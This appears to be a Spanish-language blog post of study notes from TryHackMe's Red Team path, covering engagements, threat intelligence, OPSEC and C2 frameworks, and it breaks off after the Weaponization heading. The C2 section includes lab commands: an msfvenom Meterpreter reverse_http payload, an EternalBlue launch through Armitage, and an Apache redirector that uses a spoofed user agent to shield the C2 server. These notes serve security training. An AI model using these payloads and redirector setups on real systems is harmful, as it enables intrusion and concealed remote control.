---
layout: post
title: 5.RedTeam
subtitle: Notes of the TryHackMe's path RedTeam.
tags: [thm]
---

## 0. Índice.

- 1 Red Team Fundamentals.
- 1.1. Red Team Fundamentals.
- 1.2. Red Team Engagements.
- 1.3. Red Team Threat Intel.
- 1.4. Red Team OPSEC.
- 1.5. Intro to C2.
- 2 Initial Access.
- 2.1. Red Team Recon.
- 2.2. Weaponization.
- 2.3. Password Attacks.
- 2.4. Phising.
- 3 Post Compromise.
- 3.1. The Lay of the land (Windows Security Fundamentals).
- 3.2. Enumeration.
- 3.3. Windows Privilege Escalation I.
- 3.4. Windows Privilege Escalation II (Tib3rius).
- 3.5. Windows Local Persistence.
- 3.6. Lateral Movement and Pivoting.
- 3.7. Data Exfiltration.
- 4 Host Evasion.
- 4.1. Windows Internals.
- 4.2. Introduction to Windows API.
- 4.3. Abusing Windows Internals.
- 4.4. Introduction to Antivirus.
- 4.5. AV Evasion: Shellcode.
- 4.6. Obfuscation Principles.
- 4.7. Signature Evasion.
- 4.8. Bypassing UAC.
- 4.9. Runtime Detection Evasion.
- 4.10. Evading Logging and Monitoring.
- 4.11. Living Off the Land.

<br />

### 1. Red Team Fundamentals.
#### 1.1. Red Team Fundamentals.

7.BufferOverflowIntroduction.md

La ciberseguridad se puede entender como una carrera entre los *white hat* (o hackers éticos) y los *black hat* (o ciberdelincuentes) en el sentido de que a medida que las amenazas evolucionan, los servicios de seguridad deben evolucionar para poder prevenir tales amenazas.

<br />

**Vulnerability Assessments and Penetration testing Limitations**

Un redteamer intenta llevar a cabo test para ver de cuántas maneras puede comprometer un sistema objetivo y hasta qué punto.

Entre los distintos métodos encontramos dos niveles en los que podemos hacer esto:

- *Evaluación de Vulnerabilidades*: El Vulnerability Assessments en el que intentamos encontrar el máximo número de vulnerabilidades posibles en todos los hosts de una red pero no intentamos explotar ninguna de ellas. Se trata de un trabajo de recopilación que se centra en el escaneo de vulnerabilidades sobre hosts que se consideran como entidades individuales.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220915172959.png' | relative_url }}" text-align="center"/>
</div>

- *Pruebas de Penetración*: Por otro lado y como una entidad distinta encontraríamos el Penetration Tests que resulta en una extensión de las tareas del Vulnerability Assessments pero añadiendo los trabajos de explotación y post-explotación sobre las vulnerabilidades encontradas y sistemas comprometidos en la red.

Las pruebas de penetración pueden comenzar con la búsqueda de vulnerabilidades como una vulnrability assessments regular, pero brindan más información sobre cómo un atacante puede encadenar vulnerabilidades para lograr objetivos específicos. Si bien su enfoque sigue siendo *identificar* vulnerabilidades y obtener información para establecer medidas de protección de la red, la principal diferencia consiste en que el Penetration Test considera la red como un ecosistema completo permitiendo al white hacker obtener beneficio de las interacciones entre sus componentes.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220915173608.png' | relative_url }}" text-align="center"/>
</div>

Por último, hablemos sobre qué son los APT o Advanced Persistent Threats (Amenazas Persistentes Avanzadas) son grupos de atacantes altamente calificados, generalmente patrocinados por naciones o grupos delictivos organizados. Se dirigen principalmente a infraestructura crítica, organizaciones financieras e instituciones gubernamentales. Se denominan persistentes porque las operaciones de estos grupos pueden permanecer sin ser detectadas en redes comprometidas durante períodos prolongados.

<br />

**Red Team Engagements**

Para mantenerse al día con las amenazas emergentes, las actitudes del Red Team se diseñaron para cambiar el enfoque de Pentest a un proceso que nos permita identificar las capacidades de nuestro equipo defensivo para *detectar* y *responder* a una amenzara real. No reemplazan las pruebas de penetración tradicionales, sino que las complementan centrándose en la detección y la respuesta en lugar de la prevención.

*Red teaming* es un término tomado del campo militar. En los ejercicios militares, un grupo tomaría el papel de un equipo rojo para simular técnicas de ataque para probar las capacidades de reacción de un equipo defensor, generalmente conocido como Blue Team, contra las estrategias conocidas del adversario. Traducido al mundo de la ciberseguridad, el objetivo del Red Team consiste en emular las tácticas, técnicas y procedimientos de una ameneza real para que podamos medir cómo de bien responden las defensas erigidas por el Blue Team y, en última instancia, mejorar los controles de seguridad existentes.

Tomando la misma red que antes, en un compromiso de equipo rojo donde el objetivo es comprometer el servidor de la intranet, planificaríamos una forma de alcanzar nuestro objetivo interactuando lo menos posible con otros hosts. Mientras tanto, se puede evaluar la capacidad del equipo azul para detectar y responder en consecuencia al ataque:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916104214.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Teams and Functions of an Engagement**

En un *engagement* entre el Red y Blue Team podemos diferenciar varios equipos, cada uno con su propia funcionalidad:

- *Red Cell*: Una célula roja es el equipo que lleva a cabo la parte ofensiva del engagement, simula un atacante real para poner a prueba las medidas de seguridad del Blue Cell.
- *Blue Cell*: Es el lado opuesto al anterior intenta erigir defensas para poner lo más difícil posible al equipo rojo una penetración en la network y un posterior compromiso de los sistemas.
- *White Cell*: En algunas ocasiones media entre las actividades del Blue Team y el Red Team durante el engagement.

Para lo que nos interesa que sería el Red Team, existen diferentes roles:

- *Lead*: Planea y organiza el engagement a alto nivel y seguidamente delega funciones y responsabilidades de pequeñas operaciones específicas dentro del plan a otros especialistas denominados *Operators*.
- *Assistant Lead*: Asiste técnicamente al Lead.
- *Operators*: Operadores que dirigen pequeñas operaciones como agentes de campo en base a las instrucciones del Lead.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916105453.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Engagement Structure**

Una función central del Red Team es la emulación del adversario. Si bien no es obligatorio, se usa comúnmente para evaluar lo que haría un adversario real en un entorno utilizando sus herramientas y metodologías. El Red Team puede usar cyber kill chains para resumir y evaluar los pasos y procedimientos de un engagement.

Muchos organismos de regulación y estandarización han lanzado su *Cyber Kill Chain*. A continuación se muestra una pequeña lista de cadenas estándar de cyber kill:

- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://unifiedkillchain.com/)
- [Varonis Cyber Kill Chain](https://www.varonis.com/blog/cyber-kill-chain/)
- [Active Directory Attack Cycle](https://github.com/infosecn1nja/AD-Attack-Defense)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

En esta sala, comúnmente haremos referencia a "Lockheed Martin Cyber Kill Chain". Es la más estandarizada:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916105852.png' | relative_url }}" text-align="center"/>
</div>

La Cyber Kill Chain de Lockheed Martin se centra en un perímetro débil o una brecha externa. A diferencia de otras cadenas de muerte, no proporciona un desglose detallado del movimiento interno. Puede pensar en esta cadena de eliminación como un resumen de todos los comportamientos y operaciones presentes.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916105934.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.2. Red Team Engagements.

7.BufferOverflowIntroduction.md

La clave para un compromiso exitoso es una planificación y comunicación bien coordinadas entre todas las partes involucradas. Esta sala se centrará en varios componentes de un compromiso de equipo rojo y en la planificación y documentación de una campaña para un compromiso de equipo rojo.

<br />

**Defining Scope and Objectives**

Los engagement pueden ser muy complejos y burocráticos. La clave para un engagement exitoso es definir claramente los objetivos o metas del cliente. Los objetivos del cliente deben discutirse entre el cliente y el Red Team para crear un entendimiento mutuo entre ambas partes sobre lo que se espera y se proporciona. Los objetivos establecidos son la base para el resto de la documentación y la planificación del encargo.

Sin objetivos y expectativas claras y concretas, te estás preparando para una campaña muy desestructurada y sin planificación. Los objetivos marcan la pauta para el resto del compromiso.

Al evaluar los objetivos de un cliente y planificar los detalles del compromiso, a menudo deberá decidir qué tan enfocada es la evaluación.

Los enfrentamientos se pueden categorizar entre una prueba de penetración interna/de red general o una emulación de adversario enfocada. Una emulación de adversario enfocada definirá un APT o grupo específico para emular dentro de un enfrentamiento. Por lo general, esto se determinará en función de los grupos que se dirigen a las industrias particulares de la empresa, es decir, instituciones financieras y  [APT38](https://content.fireeye.com/apt/rpt-apt38) . Una prueba de penetración interna o de red seguirá una estructura similar, pero a menudo estará menos enfocada y utilizará TTP más estándar.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916134613.png' | relative_url }}" text-align="center"/>
</div>

Los objetivos del cliente también afectarán las reglas generales de compromiso y alcance del compromiso.

Los objetivos del cliente solo establecen una definición básica de las metas del compromiso del cliente. Los planes de compromiso específicos ampliarán los objetivos del cliente y determinarán los detalles del compromiso. Los planes de participación se tratarán más adelante en esta sala.

La siguiente piedra angular para un compromiso preciso y transparente es un alcance bien definido. El alcance de un compromiso variará según la organización y el aspecto de su infraestructura y postura. El alcance de un cliente normalmente definirá lo que no  _puede_ hacer ni apuntar; también puede incluir lo que  _puede_  hacer o apuntar. Si bien los objetivos del cliente se pueden discutir y determinar junto con el equipo proveedor, solo el cliente debe establecer un alcance. En algunos casos, el equipo rojo puede discutir una queja del alcance si afecta un compromiso. Deben tener una comprensión clara de su red y las implicaciones de una evaluación. Los detalles del alcance y la redacción siempre se verán diferentes, a continuación se muestra un ejemplo de cómo se vería la palabrería dentro del alcance de un cliente.

- Sin exfiltración de datos.
- Los servidores de producción están fuera de los límites.
- 10.0.3.8/18 está fuera del alcance.
- 10.0.0.8/20 está dentro del alcance.
- El tiempo de inactividad del sistema no está permitido bajo ninguna circunstancia.
- La exfiltración de PII está prohibida.

<br />

**Rules of Engagement**

El *Rules of Engagement* (RoE) son un esquema legalmente vinculante de los objetivos y el alcance del cliente con más detalles sobre las expectativas de compromiso entre ambas partes. Este es el primer documento "oficial" en el proceso de planificación del compromiso y requiere la debida autorización entre el cliente y el equipo rojo. Este documento a menudo actúa como el contrato general entre las dos partes; También se puede utilizar un contrato externo u otros NDA (Acuerdos de confidencialidad). 

El formato y la redacción de las RoE son fundamentales, ya que es un contrato legalmente vinculante y establece expectativas claras.

Cada estructura de RoE será determinada por el cliente y el equipo rojo y puede variar en la longitud del contenido y las secciones generales. A continuación se muestra una breve tabla de las secciones estándar que puede ver en el RoE.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220916135145.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.3. Red Team Threat Intel.

**Qué es Thrat Intelligence**

Threat Intelligence (TI) (o Cyber Threat Intelligence, CTI) es la información sobre las TTPs (Tactics, Techniques and Procedures) de un posible atacante utilizado en gran medida por el Blue Team para configurar medidas de defensa.

<br />

**Applying Threat Intel to Red Team**

El Red Team también puede utilizar la CTI para realizar una emulación más precisa de un posible atacante. Para ello, suelen utilizar plataformas y marcos de inteligencia de amenazas como  *MITRE ATT&CK*, *TIBER-EU* y *OST Map*.

Estos marcos cibernéticos recopilarán TTPs conocidos y los categorizarán en función de características variables, tales como,

1. Grupo de amenazas
2. Fase de Cyber Kill Chain
3. Táctica
4. Objetivo/Meta

Una vez que se selecciona un adversario objetivo, el objetivo es identificar todos los TTP categorizados con ese adversario elegido y asignarlos a una Cyber Kill Chain conocida.

<br />

**The TIBER-UE framework**

El *TIBER-EU* (Threat Intelligence-based Ethical Red Teaming) es un framework desarrollado por el European Central Bank que se centra alrededor del uso de la threat intelligence.

Del  [white paper ECB TIBER-EU](https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf) , "El marco para la formación de equipos rojos éticos basados en inteligencia de amenazas (TIBER-EU) permite a las autoridades europeas y nacionales trabajar con infraestructuras e instituciones financieras (en lo sucesivo denominadas colectivamente como 'entidades') para poner en colocar un programa para probar y mejorar su resiliencia contra ataques cibernéticos sofisticados".

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220917153807.png' | relative_url }}" text-align="center"/>
</div>

La principal diferencia entre este marco y otros es la  fase _de "Prueba"_  que requiere inteligencia de amenazas para alimentar las pruebas del equipo rojo.

<br />

**TTP Mapping**

El mapeo de TTP se emplea por el Red Cell para mapear los TTPs recopilados por los adversarios en una Cyber Kill Chain estándar con el fin posteriormente de planificar una estrategia de ataque adecuada durante el engagement.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220917155243.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.4. Red Team OPSEC.

7.BufferOverflowIntroduction.md

OPSEC es el acrónimo de Operations Security, se trata de un término acuñado por el ejército de los estados unidos en el campo de la ciberseguridad.

El NIST lo definde de la siguiente manera:

"Proceso sistemático y comprobado mediante el cual se puede negar a posibles atacantes información sobre recursos al identificar, controlar y proteger evidencia generalmente no clasificada de la planificación y ejecución de actividades sensibles. El proceso consta de cinco pasos: identificación de información crítica, análisis de amenazas, análisis de vulnerabilidades, evaluación de riesgos y aplicación de contramedidas apropiadas"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220917161932.png' | relative_url }}" text-align="center"/>
</div>

OPSEC es un proceso para *identificar* , *controlar* y *proteger* cualquier información relacionada con la planificación y ejecución de actividades sensibles en un determinado proyecto.

El proceso OPSEC consta de cinco pasos:

1. Identificar información crítica:
2. Analizar amenazas
3. Analizar vulnerabilidades
4. Evaluar riesgos
5. Aplicar las contramedidas apropiadas

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220917162247.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.5. Intro to C2.

7.BufferOverflowIntroduction.md

C2, o Command and Control, es un framework dirigido a manejar más fácilmente dispositivos comprometidos durante el engagement así como efectuar pivoting con más facilidad. Un ejemplo de framework C2 sería Metasploit, Armitage, Powershell Empire, Covenant, Silver.

<br />

**Command and Control Framework Structure. Payload Types. Modules. Listeners.**

Veámos ahora la estructura en términos muy simples de un dispositivo C2 en su totalidad:

- *C2 Server*:

En primer lugar debemos comprender qué es un servidor C2, cuáles son los componentes y cuál es su función.

Este sirve como un *hub*, o centro de actividad, para los distintos agentes de control de dispositivos comprometidos por un atacante:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220917184704.png' | relative_url }}" text-align="center"/>
</div>

El atacante interactúa con estos agentes de control a través de dicho servidor al cual los anteriores acuden periodicamente a la espera de comandos del atacante.

<br />

- *Agents/Payloads*:

Generalmente, cuando explotamos una máquina lo hacemos mediante un *exploit* que es un mecanismo de acción que saca partido de una vulnerabilidad, un fallo de configuración que predispone al sistema a que un atacante penetre en él, que a su vez lleva incorporado un *payload* o carga útil que define lo que se hace en el sistema ( o lo que el sistema hace para el atacante) cuando ya se ha traspasado la vulnerabilidad.

Cuando este payload es un dispositivo de administración remota, como un cliente de conexiones o por el estilo, en el contexto del Command and Control se denomina *agente*.

Así, un agente es un programa generado por el marco C2 que, una vez en el dispositivo víctima, llama de vuelta a un listener en el C2 Server. La mayoría de las veces, este agente suele tener una funcionalidad superior que una reverse shell corriente; implementan pseudocomandos para facilitar la vida del *red team operator*, por ejemplo Meterpreter sería un agente en el entorno de Metasploit. 

<br />

- *Listener*:

Se trata de una aplicación corriendo en el servidor C2 que atiende conexiones efectuadas por agentes en máquinas comprometidas.

<br />

- *Beacons*:

Un beacon es un paquete que se envía desde el agente de alguna máquina cliente comprometida al listener sin otro propósito más que el de informar al C2 Server que la conexión con ese cliente concreto sigue "viva" y no se ha perdido.

Estos paquetes se envían periodicamente entre ambos dispositivos si no hay un intercambio de información de otro tipo. Es decir, que si el agente no recibe instrucciones del servidor en un monto de tiempo "x" entonces se activa una característrica de configuración del propio agente; "*Sleep Timers*" que envía un paquete cada vez que pase "x" cantidad de tiempo sin recibir respuesta del servidor.

Conviene añadir que algunos antivirus, firewalls, y otras medidas de seguridad tienen implementadas características de reconocimiento por las que buscan patrones en el tráfico de red con la finalidad de encontrar tráfico de origen malicioso como el tráfico beaconing. En este sentido, la periodicidad del beaconing es una característica débil con frecuencia reconocida por estas herramientas de seguridad que automáticamente cortan la línea de comunicación entre el origen y el destino del tráfico beaconing.

Para "countear" esta medida algunos entornos C2 han desarrollado nueva tecnología como los *jitters* que, entre otras cosas, añaden variaciones a los *Sleep Timers* con la finalidad de difuminar esa periodicidad tan reconocible volviendo al beaconing un intercambio de paquetes con patrones semi-irregulares. También cambián el contenido del beacon para que contenga diversos tipos de datos con la finalidad de que además de intercambiarse en tiempos irregulares, el contenido de los paquetes también sea irregular entre los mismos paquetes.

<br />

Así, nos queda claro que en esencia un C2 es un dispositivo de escucha y control de dispositivos comprometidos que actúa a través de agentes que se instauran dentro del exploit a modo de payload que se utiliza para penetrar en un dispositivo.

Veámos así los distintos tipos de payloads que hay dentro del entorno de un C2 para entender las distintas formas que existen de cargar un agente dentro de un dispositivo comprometido.

Esencialmente encontramos dos tipos de payloads:

- *Stageless*: Este es el tipo más simple, contiene el agente en su totalidad y tan pronto como este se instaura en la máquina comienza a enviar beacons al C2 server indicando que está a la espera de instrucciones:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918122138.png' | relative_url }}" text-align="center"/>
</div>

- *Staged Payloads*: Estos cargan el agente parcialmente en el payload (a esto se le denomina *Dropper* y una vez se ha finalizado el exploit, este descarga el resto del agente. Este es un método preferido sobre los stageless porque se necesita menos cantidad de código para enviar el agente facilitando así, por ejemplo, la ofuscación del código para eludir los programas antivirus.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918122609.png' | relative_url }}" text-align="center"/>
</div>

Así, se tienen los siguientes pasos:

1. La víctima descarga y ejecuta el dropper.
2. El dropper vuelve a llamar al C2 server para indicar el inicio de la descarga del resto del agente.
3. El  C2 server envía el resto del agente a la víctima.
4. El agente se instala.
5. Por último, el C2 Beaconing se inicializa y el Red Teamer/Threat Actors puede interactuar con la víctima en el C2 server.

<br />

Además de los agentes también tenemos los modulos que son payloads que tienen un propósito específico y diferente al del agente, por ejemplo: Post-explotation modules para volcar contraseñas y nombres de usuario entre otros o Pivoting modules como el "*SMB Beacon*" que facilitan al atacante, si tiene privilegios de administrador en una máquina, el interactuar con otros dispositivos de difícil acceso en el resto de la red.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918123537.png' | relative_url }}" text-align="center"/>
</div>

Por último, examines los tipos de listeners. Un *Listener* como ya hemos indicado antes es un programa que escucha peticiones entrantes de clientes a través de un protocolo concreto. En este sentido, además de listener con los que podemos estar más que familizarizados como por ejemplo listener de reverse shell en netcat también podemos encontrar:

- *Standard Listener*: Directamente escuchan sobre TCP/UDP mandando comandos en texto claro.
- *HTTP/HTTPS Listeners*: Estos enmascarán un C2 Server a través de un servidor web utilizando técnicas como Domain Fronting o Malleable C2. Cuando se comunica específicamente a través de HTTPS, es menos probable que un Firewall o similar bloquee las comunicaciones. Metasploit tiene soporte completo para oyentes HTTP/HTTPS.
- *DNS Listener*: Los listeners de tipo DNS son una técnica popular que se usa específicamente en la etapa de exfiltración donde normalmente se requiere configurar una infraestructura adicional o, como mínimo, se debe comprar y registrar un nombre de dominio, y se debe configurar un servidor DNS público. Es posible configurar operaciones DNS C2 en Metasploit con la ayuda de herramientas adicionales.
- *SMB Listener*: La comunicación a través de túneles SMB es un método popular de elección, especialmente cuando se trata de una red restringida; a menudo permite una rotación más flexible con varios dispositivos que se comunican entre sí y solo un dispositivo se conecta a través de un protocolo más común como HTTP/HTTPS. Metasploit tiene soporte para Named Pipes.

<br />

**C2 Setting UP, Operation Basics & Sample Exploit**

Vamos a montar una estructura C2 mediante Armitage:

- *Setting Up Armitage*: En primer lugar, lo que hacemos es clonar el repositiorio de armitage de Github:

```bash
git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918183127.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, leemos el *readme.txt* para ver las instrucciones y ahí encontramos que debemos asegurarnos de tener una serie de configuraciones listas que el OS del navegador de TryHackMe ya tiene realizadas por nosotros. Así, todo lo que queda es ejecutar el script "package":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918183624.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, se habrá construido la carpeta ./release/unix:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918183725.png' | relative_url }}" text-align="center"/>
</div>

En ella hay dos ficheros clave:

- *Teamserver*: Este fichero iniciará el servidor Armitage, toma 2 argumentos; la dirección IP y una contraseña.
- *Armitage*: Este es el fichero que se va a utilizar para conectarse al Armitage Teamserver. Al ejecutar el binario se despliega un prompt se abre y te pide información:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918184845.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, antes de lanzar Armitage hay que preparar el entorno de Armitage el cual descansa fuertemente sobre la base de datos Metasploit mediante dos simples pasos:

- *Iniciar el servicio PostgreSQL*:

```bash
systemctl start postgresql && systemctl status postgresql
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918185337.png' | relative_url }}" text-align="center"/>
</div>

- *Iniciar la base de datos de Metasploit*:

```bash
msfdb delete && msfdb init
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220918214640.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Starting and Connecting to Armitage*: Srguidamente procedemos a ejecutar los ficheros Teamserver y Armitage con el siguiente comando:

```bash
cd release/unix && ./teamserver <YourIP> P@ssw0rd123
```

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919104520.png' | relative_url }}" text-align="center"/>
</div>

Y ejecutamos el fichero Armitage, cuando aparezca el prompt damos las credenciales proporcionadas por Teamserver y se abrirá una interfaz gráfica del sistema:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919105327.png' | relative_url }}" text-align="center"/>
</div>

<br />

Ahora que tenemos el armitage montado vamos a hacer un *Sample Exploit* patra ver comandos básicos de Armitage:

- *Host Enumeration with Armitage*: Podemos realizar un escaneo con Nmap:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919105752.png' | relative_url }}" text-align="center"/>
</div>

Saltará un prompt que nos pedirá el host a escanear seguidamente se efectuará un escaneo que aparecerá debajo en al consola como una nueva pestaña "nmap":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919105844.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar cuál es el comando que se ha introducido en la parte superior de la consola.

<br />

- *Explotation with Armitage*: Haciendo un escaneo más intenso podemos ver que nuestra máquina es un Windows 7 con un smb server escuchando. Quizá es vulnerable al clásico ataque con el malware "Eternal Blue". Para utilizarlo buscamos en el árbol de directorios de la derecha el fichero: Exploit/Windows/smb/ms17_010_eternalblue:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919111030.png' | relative_url }}" text-align="center"/>
</div>

Damos doble click y aparecerá una lsita de opciones de entre las cuales debemos setear el RHOSTS:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919111111.png' | relative_url }}" text-align="center"/>
</div>

Finalmente pulsamod "Launch" para lanzar el exploit, seguidamente en la consola se abre una nueva pestaña, "exploit" donde nos indica el progreso del mismo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919111254.png' | relative_url }}" text-align="center"/>
</div>

Cuando el exploit se complete pulsamos doble botón sobre el icono de la máquina y le damos a shell1 > Interact y se abrirá una nueva pestaña llamada "Shell"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919112009.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Advanced C2 Setups. Command and Control Redirectors.**

Un *Redirector* es exactamente lo que suena que es; un servidor que "redirige" las solicitudes HTTP/HTTPS según la información contenida en el cuerpo de una solicitud HTTP. Lo que haremos en esta sección es modificar un servidor Apache2 para convertirlo en un redirector:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919114309.png' | relative_url }}" text-align="center"/>
</div>

La función principal de un Redirector en el contexto de un atacante que utiliza un C2 consiste en salvaguardar la integridad del C2 Server regulando las conexiones (firewall) que se hacen sobre el mismo asegurándo así que nadie salvo los clientes de máquinas comprometidas, a través del redirector, pueden acceder al C2 Server si este último es detectado.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919114824.png' | relative_url }}" text-align="center"/>
</div>

Pasemos ahora ver cómo montar un Redirector a partir de un Apache 2 web server. Antes que nada, debemos saber que vamos a hacer a través de dos herramientas, la primera es, evidentemente, Apache2 y la segunda es un C2; Metasploit.

- *Apache2*: Vamos a modificar la funcionalidad de un servidor Apache2. En primer lugar, instalamos el servicio y seguidamente habilitamos los módulos necesarios: rewrite, proxy, proxy_http, headers.

```bash
apt install apache2 -y && a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
```

<br />

*Nota: Es importante observar que en AttackThBox el puerto 80 (que es el puerto que está por defecto habilitado para Apache2) está en uso, hay que cambiar el puerto que por defecto utiliza Apache en el fichero /etc/apache2/ports.conf

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919154651.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919154808.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Reverse_Http payload*: Ahora con Msfvenom vreamos un payload que consiste en una shell que se envía a través de HTTP:

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

Y una vez se ha ejecutado el binario en la víctima y hallamos establecido un intercambio de información entre la víctima y el C2 con el listener adecuado, podemos ver que la comunicación entre ambos se da en HTTP con una herramietna como Wireshark:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919161249.png' | relative_url }}" text-align="center"/>
</div>

<br />

Hast aquí tendríamos un C2 Server enmascarado como un web server, ahora hay que modificar este web server para obtener un Redirector:

- *Modifying the Apache Config File*: En primer lugar revisamos el /etc/apache2/sites-available/000-default.conf:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919173552.png' | relative_url }}" text-align="center"/>
</div>

Lo que debemos hacer es añadir un par de líneas al *config file* para habilitar la funcionalidad *Rewrite Engine*[](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html): Rewrite Engine On, esto nos permite habilitar reglas de redirección de URIs, seguidamente hay que añadir una regla con: RewriteCond %{HTTP\_USER\_AGENT\} "\^NotMeterpreter\$" porque sólo queremos matchear el User-Agent "NotMeterpreter"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919174457.png' | relative_url }}" text-align="center"/>
</div>

- *Serting Up Exploit/Multi/Hnadler*: Seguidamente, abrimos una sesión Meterpreter de la siguiente manera:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919174559.png' | relative_url }}" text-align="center"/>
</div>

Y obtendríamos un Meterpreter Reverse Shell que actúa como proxy en todas nuestras comunicaciones en el redirector.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220919174635.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 2. Initial Access.
#### 2.1. Red Team Recon.

7.BufferOverflowIntroduction.md

En este Room vamos a hacer una recopilación de métodos que un atacante puede utilizar para recopilar información sobre el objetivo.

- Types of reconnaissance activities
- WHOIS and DNS-based reconnaissance
- Advanced searching
- Searching by image
- Google Hacking
- Specialized search engines
- Recon-ng
- Maltego

<br />

**Recon Activities**

El reconocimiento (recon) se puede clasificar en dos partes:

1. **Reconocimiento pasivo** : se puede llevar a cabo observando pasivamente. (OSINT)
2. **Active Recon** : requiere interactuar con el objetivo para provocarlo con el fin de observar su respuesta.

El reconocimiento pasivo no requiere interactuar con el objetivo. En otras palabras, no está enviando ningún paquete o solicitud al objetivo o a los sistemas que posee su objetivo. En cambio, el reconocimiento pasivo se basa en información disponible públicamente que recopila y mantiene un tercero. Open Source Intelligence (OSINT) se utiliza para recopilar información sobre el objetivo y puede ser tan simple como ver el perfil de redes sociales disponible públicamente de un objetivo. La información de ejemplo que podríamos recopilar incluye nombres de dominio, bloques de direcciones IP, direcciones de correo electrónico, nombres de empleados y puestos de trabajo. En la próxima tarea, veremos cómo consultar registros DNS y ampliar los temas de la sala de [Reconocimiento pasivo](https://tryhackme.com/room/passiverecon) e introducir herramientas avanzadas para ayudarlo en su reconocimiento.

El reconocimiento activo requiere interactuar con el objetivo enviando solicitudes y paquetes y observando si responde y cómo. Las respuestas recopiladas, o la falta de respuestas, nos permitirían ampliar la imagen que comenzamos a desarrollar utilizando el reconocimiento pasivo. Un ejemplo de reconocimiento activo es usar Nmap para escanear subredes de destino y hosts en vivo. Otros ejemplos se pueden encontrar en la sala [de reconocimiento activo](https://tryhackme.com/room/activerecon) . Parte de la información que nos gustaría descubrir incluye hosts en vivo, servidores en ejecución, servicios de escucha y números de versión.

El reconocimiento activo se puede clasificar como:

1. **Reconocimiento externo** : se lleva a cabo fuera de la red del objetivo y se enfoca en los activos externos evaluables desde Internet. Un ejemplo es ejecutar Nikto desde fuera de la red de la empresa.
2. **Reconocimiento interno** : realizado desde dentro de la red de la empresa objetivo. En otras palabras, el pentester o red teamer podría estar ubicado físicamente dentro del edificio de la empresa. En este escenario, podrían estar utilizando un host explotado en la red del objetivo. Un ejemplo sería usar Nessus para escanear la red interna usando una de las computadoras del objetivo.

<br />

**Built-in Tools**

Algunas herramientas qeu podemos utilizar para realizar un reconocimiento pasivo del objetivo son:

- whois
- dig, nslookup, host
- traceroute/tracert

Herramientas que podemos utilizar

#### 2.2. Weaponization.

7.BufferOverflowIntroduction.md

*Weaponization* es la segunda fase del Cyber Kill Chain Model

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920155452.png' | relative_url }}" text-align="center"/>
</div>

